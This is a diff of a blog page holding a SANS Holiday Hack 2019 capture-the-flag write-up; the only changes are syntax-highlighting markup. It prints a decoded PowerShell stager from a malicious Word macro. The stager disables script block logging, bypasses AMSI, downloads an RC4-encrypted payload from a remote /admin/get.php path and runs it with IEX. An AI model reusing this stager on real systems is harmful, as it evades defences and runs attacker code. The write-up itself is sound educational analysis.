@@ -1,4 +1,4 @@
-<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2019 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.106.0"><meta name=twitter:card content="summary"><meta name=twitter:title content="Some SANS Holiday Hack 2019 Solutions"><meta name=twitter:description content="I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2019 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.108.0"><meta name=twitter:card content="summary"><meta name=twitter:title content="Some SANS Holiday Hack 2019 Solutions"><meta name=twitter:description content="I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
 year I participated for the first time. You can find the solutions below:
 
 SANS Holiday Hack 2018 Solutions
@@ -269,51 +269,51 @@ grade will be 0/100.
 19th Century Holiday Cheer Assignment.docm
     /home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af/19th Century Holiday Cheer Assignment.docm
 </code></pre><p>The properties for the docm files is in <code>core.xml</code> but it's empty. Let's find the actual <code>core.xml</code> file from the list above.</p><pre tabindex=0><code>core.xml    /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4/core.xml
-</code></pre><p>Inside that we have the thing.</p><p><code>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</code></p><p>The PowerShell base64 decoded</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#719e07>IF</span> (<span style=color:#268bd2>$PSVerSioNTaBLe</span>.PSVERsIOn.MAJor  - gE 3)  {
-</span></span><span style=display:flex><span>    <span style=color:#268bd2>$GPF</span> = <span style=color:#cb4b16>[Ref]</span>.ASsEMBly.GETTyPE(<span style=color:#2aa198>&#39;System.Management.Automation.Utils&#39;</span>).<span style=color:#2aa198>&#34;GEtFiE`Ld&#34;</span>(<span style=color:#2aa198>&#39;cachedGroupPolicySettings&#39;</span>, <span style=color:#2aa198>&#39;N&#39;</span> + <span style=color:#2aa198>&#39;onPublic,Static&#39;</span>);
+</code></pre><p>Inside that we have the thing.</p><p><code>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</code></p><p>The PowerShell base64 decoded</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#719e07>IF</span> (<span style=color:#268bd2>$PSVerSioNTaBLe</span>.PSVERsIOn.MAJor  - gE <span style=color:#2aa198>3</span>)  {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>$GPF</span> = [<span style=color:#cb4b16>Ref</span>].ASsEMBly.GETTyPE(<span style=color:#2aa198>&#39;System.Management.Automation.Utils&#39;</span>).<span style=color:#2aa198>&#34;GEtFiE`Ld&#34;</span>(<span style=color:#2aa198>&#39;cachedGroupPolicySettings&#39;</span>, <span style=color:#2aa198>&#39;N&#39;</span> + <span style=color:#2aa198>&#39;onPublic,Static&#39;</span>);
 </span></span><span style=display:flex><span>    <span style=color:#719e07>IF</span> (<span style=color:#268bd2>$GPF</span>)  {
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$GPC</span> = <span style=color:#268bd2>$GPF</span>.GeTVAluE(<span style=color:#268bd2>$nUlL</span>);
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$GPC</span> = <span style=color:#268bd2>$GPF</span>.GeTVAluE($nUlL);
 </span></span><span style=display:flex><span>        <span style=color:#719e07>If</span> (<span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>])  {
-</span></span><span style=display:flex><span>            <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>][<span style=color:#2aa198>&#39;EnableScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>] = 0;
-</span></span><span style=display:flex><span>            <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>][<span style=color:#2aa198>&#39;EnableScriptBlockInvocationLogging&#39;</span>] = 0
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>][<span style=color:#2aa198>&#39;EnableScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>] = <span style=color:#2aa198>0</span>;
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>][<span style=color:#2aa198>&#39;EnableScriptBlockInvocationLogging&#39;</span>] = <span style=color:#2aa198>0</span>
 </span></span><span style=display:flex><span>        }
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$val</span> = <span style=color:#cb4b16>[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING, SySTEm.ObjecT]]</span>::NeW();
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$vAl</span>.AdD(<span style=color:#2aa198>&#39;EnableScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>, 0);
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$vaL</span>.ADd(<span style=color:#2aa198>&#39;EnableScriptBlockInvocationLogging&#39;</span>, 0);
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$val</span> = [<span style=color:#cb4b16>COLlEcTioNs.GEneRiC.DICTIoNAry[StrING, SySTEm.ObjecT]</span>]::NeW();
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$vAl</span>.AdD(<span style=color:#2aa198>&#39;EnableScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>, <span style=color:#2aa198>0</span>);
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$vaL</span>.ADd(<span style=color:#2aa198>&#39;EnableScriptBlockInvocationLogging&#39;</span>, <span style=color:#2aa198>0</span>);
 </span></span><span style=display:flex><span>        <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>] = <span style=color:#268bd2>$VAl</span>
 </span></span><span style=display:flex><span>    } <span style=color:#719e07>ElSE</span> {
-</span></span><span style=display:flex><span>        <span style=color:#cb4b16>[SCrIPTBlOCK]</span>.<span style=color:#2aa198>&#34;GEtFIe`lD&#34;</span>(<span style=color:#2aa198>&#39;signatures&#39;</span>, <span style=color:#2aa198>&#39;N&#39;</span> + <span style=color:#2aa198>&#39;onPublic,Static&#39;</span>).SETVALUe(<span style=color:#268bd2>$NUll</span>, (NEW - OBjEct CollEcTions.GEnerIC.HashSeT<span style=color:#cb4b16>[sTrING]</span>))
+</span></span><span style=display:flex><span>        [<span style=color:#cb4b16>SCrIPTBlOCK</span>].<span style=color:#2aa198>&#34;GEtFIe`lD&#34;</span>(<span style=color:#2aa198>&#39;signatures&#39;</span>, <span style=color:#2aa198>&#39;N&#39;</span> + <span style=color:#2aa198>&#39;onPublic,Static&#39;</span>).SETVALUe($NUll, (NEW - OBjEct CollEcTions.GEnerIC.HashSeT[<span style=color:#cb4b16>sTrING</span>]))
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#cb4b16>[REf]</span>.ASSEMBlY.GETTYPe(<span style=color:#2aa198>&#39;System.Management.Automation.AmsiUtils&#39;</span>)|? {
+</span></span><span style=display:flex><span>    [<span style=color:#cb4b16>REf</span>].ASSEMBlY.GETTYPe(<span style=color:#2aa198>&#39;System.Management.Automation.AmsiUtils&#39;</span>)|? {
 </span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span>
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>    |% {
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span>.GETFielD(<span style=color:#2aa198>&#39;amsiInitFailed&#39;</span>, <span style=color:#2aa198>&#39;NonPublic,Static&#39;</span>).SEtValUe(<span style=color:#268bd2>$NUlL</span>, <span style=color:#268bd2>$True</span>)
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span>.GETFielD(<span style=color:#2aa198>&#39;amsiInitFailed&#39;</span>, <span style=color:#2aa198>&#39;NonPublic,Static&#39;</span>).SEtValUe($NUlL, $True)
 </span></span><span style=display:flex><span>    };
 </span></span><span style=display:flex><span>};
-</span></span><span style=display:flex><span><span style=color:#cb4b16>[SySteM.NeT.SERvicEPoInTMaNaGer]</span>::EXPecT100CONtInUe = 0;
+</span></span><span style=display:flex><span>[<span style=color:#cb4b16>SySteM.NeT.SERvicEPoInTMaNaGer</span>]::EXPecT100CONtInUe = <span style=color:#2aa198>0</span>;
 </span></span><span style=display:flex><span><span style=color:#268bd2>$wc</span> = <span style=color:#b58900>NEw-ObjECT</span> SysTEM.NeT.WeBCLiENT;
 </span></span><span style=display:flex><span><span style=color:#268bd2>$u</span> = <span style=color:#2aa198>&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>;
 </span></span><span style=display:flex><span><span style=color:#268bd2>$wC</span>.HEADErS.ADd(<span style=color:#2aa198>&#39;User-Agent&#39;</span>, <span style=color:#268bd2>$u</span>);
-</span></span><span style=display:flex><span><span style=color:#268bd2>$Wc</span>.ProXy = <span style=color:#cb4b16>[SySTeM.Net.WeBREQuEST]</span>::DEFaULTWebProXy;
-</span></span><span style=display:flex><span><span style=color:#268bd2>$WC</span>.PRoXy.CREDenTIAls = <span style=color:#cb4b16>[SySTEm.NET.CRedeNTiAlCAcHe]</span>::DeFaulTNeTwORkCREDenTiALS;
+</span></span><span style=display:flex><span><span style=color:#268bd2>$Wc</span>.ProXy = [<span style=color:#cb4b16>SySTeM.Net.WeBREQuEST</span>]::DEFaULTWebProXy;
+</span></span><span style=display:flex><span><span style=color:#268bd2>$WC</span>.PRoXy.CREDenTIAls = [<span style=color:#cb4b16>SySTEm.NET.CRedeNTiAlCAcHe</span>]::DeFaulTNeTwORkCREDenTiALS;
 </span></span><span style=display:flex><span><span style=color:#268bd2>$Script:Proxy</span> = <span style=color:#268bd2>$wc</span>.Proxy;
-</span></span><span style=display:flex><span><span style=color:#268bd2>$K</span> = <span style=color:#cb4b16>[SySTEM.Text.EncOdING]</span>::ASCII.GeTBYteS(<span style=color:#2aa198>&#39;zd!Pmw3J/qnuWoHX~=g.{&gt;p,GE]:|#MR&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#268bd2>$K</span> = [<span style=color:#cb4b16>SySTEM.Text.EncOdING</span>]::ASCII.GeTBYteS(<span style=color:#2aa198>&#39;zd!Pmw3J/qnuWoHX~=g.{&gt;p,GE]:|#MR&#39;</span>);
 </span></span><span style=display:flex><span><span style=color:#268bd2>$R</span> = {
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>$D</span>, <span style=color:#268bd2>$K</span> = <span style=color:#268bd2>$ARGs</span>;
-</span></span><span style=display:flex><span>    <span style=color:#268bd2>$S</span> = 0..255;
-</span></span><span style=display:flex><span>    0..255|% {
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$J</span> = (<span style=color:#268bd2>$J</span> + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>] + <span style=color:#268bd2>$K</span>[<span style=color:#268bd2>$_</span>%<span style=color:#268bd2>$K</span>.COUnt])<span style=color:#719e07>%</span>256;
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>$S</span> = <span style=color:#2aa198>0</span>.<span style=color:#2aa198>.255</span>;
+</span></span><span style=display:flex><span>    <span style=color:#2aa198>0</span>.<span style=color:#2aa198>.255</span>|% {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$J</span> = (<span style=color:#268bd2>$J</span> + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>] + <span style=color:#268bd2>$K</span>[<span style=color:#268bd2>$_</span>%<span style=color:#268bd2>$K</span>.COUnt])<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>;
 </span></span><span style=display:flex><span>        <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$J</span>] = <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$J</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>]
 </span></span><span style=display:flex><span>    };
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>$D</span>|% {
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$I</span> = (<span style=color:#268bd2>$I</span> + 1)<span style=color:#719e07>%</span>256;
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$H</span> = (<span style=color:#268bd2>$H</span> + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>])<span style=color:#719e07>%</span>256;
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$I</span> = (<span style=color:#268bd2>$I</span> + <span style=color:#2aa198>1</span>)<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>;
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$H</span> = (<span style=color:#268bd2>$H</span> + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>])<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>;
 </span></span><span style=display:flex><span>        <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>] = <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>];
-</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span> <span style=color:#719e07>-BXoR</span><span style=color:#268bd2>$S</span>[(<span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>] + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>])<span style=color:#719e07>%</span>256] <span style=color:#586e75># change it to -BXoR</span>
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span> <span style=color:#719e07>-BXoR</span><span style=color:#268bd2>$S</span>[(<span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>] + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>])<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>] <span style=color:#586e75># change it to -BXoR</span>
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>};
@@ -321,9 +321,9 @@ grade will be 0/100.
 </span></span><span style=display:flex><span><span style=color:#268bd2>$t</span> = <span style=color:#2aa198>&#39;/admin/get.php&#39;</span>;
 </span></span><span style=display:flex><span><span style=color:#268bd2>$WC</span>.HEADErs.Add(<span style=color:#2aa198>&#34;Cookie&#34;</span>, <span style=color:#2aa198>&#34;session=reT9XQAl0EMJnxukEZy/7MS70X4=&#34;</span>);
 </span></span><span style=display:flex><span><span style=color:#268bd2>$DATa</span> = <span style=color:#268bd2>$WC</span>.DownlOADDAtA(<span style=color:#268bd2>$sEr</span> + <span style=color:#268bd2>$T</span>);
-</span></span><span style=display:flex><span><span style=color:#268bd2>$Iv</span> = <span style=color:#268bd2>$DatA</span>[0..3];
-</span></span><span style=display:flex><span><span style=color:#268bd2>$DatA</span> = <span style=color:#268bd2>$dATa</span>[4..<span style=color:#268bd2>$DatA</span>.lENGtH];
-</span></span><span style=display:flex><span> -JOIN<span style=color:#cb4b16>[ChaR[]]</span>(&amp; <span style=color:#268bd2>$R</span> <span style=color:#268bd2>$DatA</span> (<span style=color:#268bd2>$IV</span> + <span style=color:#268bd2>$K</span>))|<span style=color:#b58900>IEX
+</span></span><span style=display:flex><span><span style=color:#268bd2>$Iv</span> = <span style=color:#268bd2>$DatA</span>[<span style=color:#2aa198>0</span>.<span style=color:#2aa198>.3</span>];
+</span></span><span style=display:flex><span><span style=color:#268bd2>$DatA</span> = <span style=color:#268bd2>$dATa</span>[<span style=color:#2aa198>4</span>..<span style=color:#268bd2>$DatA</span>.lENGtH];
+</span></span><span style=display:flex><span> -JOIN[<span style=color:#cb4b16>ChaR[]</span>](&amp; <span style=color:#268bd2>$R</span> <span style=color:#268bd2>$DatA</span> (<span style=color:#268bd2>$IV</span> + <span style=color:#268bd2>$K</span>))|<span style=color:#b58900>IEX
 </span></span></span></code></pre></div><h1 id=xmas-cheer-laser---sparkle-redberry>Xmas Cheer Laser - Sparkle Redberry
 <a class=header-link href=#xmas-cheer-laser---sparkle-redberry><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>What is at <code>/home/callingcard.txt.</code>?</p><pre tabindex=0><code>PS /home/elf&gt; gc ../callingcard.txt
 What&#39;s become of your dear laser?
@@ -370,58 +370,58 @@ Fa la la la la, la la la la
 </span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>pre</span>&gt;
 </span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>body</span>&gt;
 </span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
-</span></span></code></pre></div><p>We can turn it on:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; (<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:1225/api/on).RawContent
-</span></span><span style=display:flex><span>HTTP/1.1 200 OK                                                                           
-</span></span><span style=display:flex><span>Server: <span style=color:#b58900>Microsoft-NetCore</span>/2.0                                                             
-</span></span><span style=display:flex><span>Date: Thu, 12 Dec 2019 08:12:39 GMT                                                       
-</span></span><span style=display:flex><span><span style=color:#b58900>Content-Length</span>: 32                                                                        
+</span></span></code></pre></div><p>We can turn it on:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; (<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:<span style=color:#2aa198>1225</span>/api/on).RawContent
+</span></span><span style=display:flex><span>HTTP/<span style=color:#2aa198>1.1</span> <span style=color:#2aa198>200</span> OK                                                                           
+</span></span><span style=display:flex><span>Server: <span style=color:#b58900>Microsoft-NetCore</span>/<span style=color:#2aa198>2.0</span>                                                             
+</span></span><span style=display:flex><span>Date: Thu, <span style=color:#2aa198>12</span> Dec <span style=color:#2aa198>2019</span> <span style=color:#2aa198>08</span>:<span style=color:#2aa198>12</span>:<span style=color:#2aa198>39</span> GMT                                                       
+</span></span><span style=display:flex><span><span style=color:#b58900>Content-Length</span>: <span style=color:#2aa198>32</span>                                                                        
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Christmas Cheer Laser Powered On
-</span></span></code></pre></div><p>Then we can query the output. It seems like it's just random.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>(<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:1225/api/gas -Method POST
+</span></span></code></pre></div><p>Then we can query the output. It seems like it's just random.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>(<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:<span style=color:#2aa198>1225</span>/api/gas -Method POST
 </span></span><span style=display:flex><span>    -Body <span style=color:#2aa198>&#34;O=5&amp;H=5&amp;He=5&amp;N=5&amp;Ne=20&amp;Ar=10&amp;Xe=10&amp;F=20&amp;Kr=10&amp;Rn=10&#34;</span>).RawContent
 </span></span></code></pre></div><p><code>Could commands hold riddles in hist'ry?</code>? See PowerShell history?</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>Get-History</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  Id CommandLine
 </span></span><span style=display:flex><span>  -- -----------
-</span></span><span style=display:flex><span>   1 <span style=color:#b58900>Get-Help</span> -Name <span style=color:#b58900>Get-Process</span> 
-</span></span><span style=display:flex><span>   2 <span style=color:#b58900>Get-Help</span> -Name Get-* 
-</span></span><span style=display:flex><span>   3 <span style=color:#b58900>Set-ExecutionPolicy</span> Unrestricted 
-</span></span><span style=display:flex><span>   4 <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>ConvertTo-HTML</span> -Property Name, Status &gt; C:\services.htm 
-</span></span><span style=display:flex><span>   5 <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>Export-CSV</span> c:\service.csv 
-</span></span><span style=display:flex><span>   6 <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>Select-Object</span> Name, Status | <span style=color:#b58900>Export-CSV</span> c:\service.csv 
-</span></span><span style=display:flex><span>   7 (<span style=color:#b58900>Invoke-WebRequest</span> http://127.0.0.1:1225/api/angle<span style=color:#719e07>?</span>val=65.5).RawContent
-</span></span><span style=display:flex><span>   8 <span style=color:#b58900>Get-EventLog</span> -Log <span style=color:#2aa198>&#34;Application&#34;</span> 
-</span></span><span style=display:flex><span>   9 I have many name=value variables that I share to applications system wide. At a com…
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>1</span> <span style=color:#b58900>Get-Help</span> -Name <span style=color:#b58900>Get-Process</span> 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>2</span> <span style=color:#b58900>Get-Help</span> -Name Get-* 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>3</span> <span style=color:#b58900>Set-ExecutionPolicy</span> Unrestricted 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>4</span> <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>ConvertTo-HTML</span> -Property Name, Status &gt; C:\services.htm 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>5</span> <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>Export-CSV</span> c:\service.csv 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>6</span> <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>Select-Object</span> Name, Status | <span style=color:#b58900>Export-CSV</span> c:\service.csv 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>7</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>8</span> <span style=color:#b58900>Get-EventLog</span> -Log <span style=color:#2aa198>&#34;Application&#34;</span> 
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>9</span> I have many name=value variables that I share to applications system wide. At a com…
 </span></span></code></pre></div><p>But that does not show us everything, we are only looking for commands that do <code>Invoke</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>Get-History</span> | <span style=color:#b58900>Where-Object</span> {<span style=color:#268bd2>$_</span>.CommandLine <span style=color:#719e07>-like</span> <span style=color:#2aa198>&#34;*Invoke*&#34;</span>} 
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  Id CommandLine
 </span></span><span style=display:flex><span>  -- -----------
-</span></span><span style=display:flex><span>   7 (<span style=color:#b58900>Invoke-WebRequest</span> http://127.0.0.1:1225/api/angle<span style=color:#719e07>?</span>val=65.5).RawContent
-</span></span><span style=display:flex><span>  11 (<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:1225/api/on).RawContent
-</span></span><span style=display:flex><span>  12 (<span style=color:#b58900>Invoke-WebRequest</span> http://127.0.0.1:1225/api/angle<span style=color:#719e07>?</span>val=65.5).RawContent
-</span></span><span style=display:flex><span>  13 (<span style=color:#b58900>Invoke-WebRequest</span> http://127.0.0.1:1225/api/output).RawContent
+</span></span><span style=display:flex><span>   <span style=color:#2aa198>7</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
+</span></span><span style=display:flex><span>  <span style=color:#2aa198>11</span> (<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:<span style=color:#2aa198>1225</span>/api/on).RawContent
+</span></span><span style=display:flex><span>  <span style=color:#2aa198>12</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
+</span></span><span style=display:flex><span>  <span style=color:#2aa198>13</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/output).RawContent
 </span></span></code></pre></div><p><strong><code>http://127.0.0.1:1225/api/angle?val=65.5</code></strong></p><p>Did not work, let's leave, return and get everything.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>Get-History</span> | <span style=color:#b58900>Format-List</span> -Property *
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#586e75># removed</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Id                 : 7
+</span></span><span style=display:flex><span>Id                 : <span style=color:#2aa198>7</span>
 </span></span><span style=display:flex><span>CommandLine        : (<span style=color:#b58900>Invoke-WebRequest</span> 
-</span></span><span style=display:flex><span>                     http://127.0.0.1:1225/api/angle<span style=color:#719e07>?</span>val=65.5).RawContent
+</span></span><span style=display:flex><span>                     http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
 </span></span><span style=display:flex><span>ExecutionStatus    : Completed
-</span></span><span style=display:flex><span>StartExecutionTime : 11/29/19 4:56:44 PM
-</span></span><span style=display:flex><span>EndExecutionTime   : 11/29/19 4:56:44 PM
-</span></span><span style=display:flex><span>Duration           : 00:00:00.0310799
+</span></span><span style=display:flex><span>StartExecutionTime : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>56</span>:<span style=color:#2aa198>44</span> PM
+</span></span><span style=display:flex><span>EndExecutionTime   : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>56</span>:<span style=color:#2aa198>44</span> PM
+</span></span><span style=display:flex><span>Duration           : <span style=color:#2aa198>00</span>:<span style=color:#2aa198>00</span>:<span style=color:#2aa198>00.0310799</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#586e75># removed</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Id                 : 9
+</span></span><span style=display:flex><span>Id                 : <span style=color:#2aa198>9</span>
 </span></span><span style=display:flex><span>CommandLine        : I have many name=value variables that I share to applications 
